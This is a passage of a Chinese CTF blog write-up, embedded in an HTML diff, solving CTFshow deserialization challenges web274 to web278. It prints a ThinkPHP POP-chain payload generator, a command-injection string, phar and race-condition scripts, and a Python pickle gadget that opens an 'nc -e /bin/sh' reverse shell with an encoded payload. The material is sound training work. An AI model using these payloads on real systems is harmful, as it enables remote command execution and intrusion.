+    function __construct()&#123;
+        $this-&gt;filter &#x3D; &quot;system&quot;;
+        $this-&gt;config &#x3D; [&quot;var_ajax&quot;&#x3D;&gt;&#39;lin&#39;]; &#x2F;&#x2F;PHP函数的参数
+        $this-&gt;hook &#x3D; [&quot;visible&quot;&#x3D;&gt;[$this,&quot;isAjax&quot;]];
+    &#125;
+&#125;
+
+
+namespace think\process\pipes;
+
+use think\model\concern\Conversion;
+use think\model\Pivot;
+class Windows
+&#123;
+    private $files &#x3D; [];
+
+    public function __construct()
+    &#123;
+        $this-&gt;files&#x3D;[new Pivot()];
+    &#125;
+&#125;
+namespace think\model;
+
+use think\Model;
+
+class Pivot extends Model
+&#123;
+&#125;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+?&gt;
+</code></pre>
+<p>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&#x2F;?lin&#x3D;cat &#x2F;f*&amp;data&#x3D;TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</code></pre>
+<p>lin中传入命令，data传入反序列化<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690629861855-a14768bf-7926-4b4e-8c0a-4e9fd1154539.png" alt="image.png"></p>
+<h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><p><code>__destruct</code>当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要<code>$this-&gt;evilfile</code>是true就可以执行系统命令了。<br>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">?fn&#x3D;;cat f*
+post: flag&#x3D;123</code></pre>
+<h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a></p>
+</blockquote>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>晚上挺不住，放一下别人payload：<br>在上个题的基础上增了了 判断$this-&gt;admin所以真的需要我们去通过反序列化修改admin的值了。因为题目中没有反序列化函数，所以需要通过其他方式。<br>因为题目中有写文件的函数，所以可以通过file_put_contents写phar文件，然后再通过file_put_contents触发phar反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。<br>生成phar：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+class filter&#123;
+    public $filename &#x3D; &quot;1|cat f*&quot;;
+    public $filecontent;
+    public $evilfile &#x3D; true;
+    public $admin &#x3D; true;
+&#125;
+
+$phar &#x3D; new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+
+$o &#x3D; new filter();
+$phar-&gt;setMetadata($o);
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+$phar-&gt;stopBuffering();
+</code></pre>
+<p>条件竞争：</p>
+<pre class="language-php" data-language="php"><code class="language-php">import requests
+import threading
+import base64
+url &#x3D; &#39;http:&#x2F;&#x2F;b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show&#x2F;&#39;
+
+f &#x3D; open(&#39;.&#x2F;phar.phar&#39;, &#39;rb&#39;)
+
+data &#x3D; f.read()
+flag &#x3D; False
+
+def work1():
+    requests.post(url+&quot;?fn&#x3D;a&quot;, data&#x3D;data)
+
+
+def work2():
+    global flag
+    r &#x3D; requests.post(url+&quot;?fn&#x3D;phar:&#x2F;&#x2F;phar.phar&#x2F;&quot;, data&#x3D;&quot;&quot;)
+    if &quot;flag&#123;&quot; in r.text and flag is False:
+        print(base64.b64encode(r.text.encode()))
+        flag &#x3D; True
+
+while flag is False:
+    a &#x3D; threading.Thread(target&#x3D;work1)
+    b &#x3D; threading.Thread(target&#x3D;work2)
+    a.start()
+    b.start()
+</code></pre>
+<h1 id="web277、web278"><a href="#web277、web278" class="headerlink" title="web277、web278"></a>web277、web278</h1><pre class="language-php" data-language="php"><code class="language-php">import pickle
+import base64
+class A(object):
+	def __reduce__(self):
+		return(eval,(&#39;__import__(&quot;os&quot;).popen(&quot;nc xxx.xxx.xxx.xxx 4567 -e &#x2F;bin&#x2F;sh&quot;).read()&#39;,))
+a&#x3D;A()
+test&#x3D;pickle.dumps(a)
+print(base64.b64encode(test))</code></pre>
+<p>payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&#x2F;backdoor?data&#x3D;gASVXwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxDX19pbXBvcnRfXygib3MiKS5wb3BlbigibmMgMTAxLjIwMC4xNTkuMTE5IDg4ODggLWUgL2Jpbi9zaCIpLnJlYWQoKZSFlFKULg&#x3D;&#x3D;</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690630246109-15f492ce-0561-499f-9588-24e51f9017a4.png" alt="image.png"></p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/74021304/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web279-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/d6dc50dc/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web214-web253SQL注入篇（三）</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
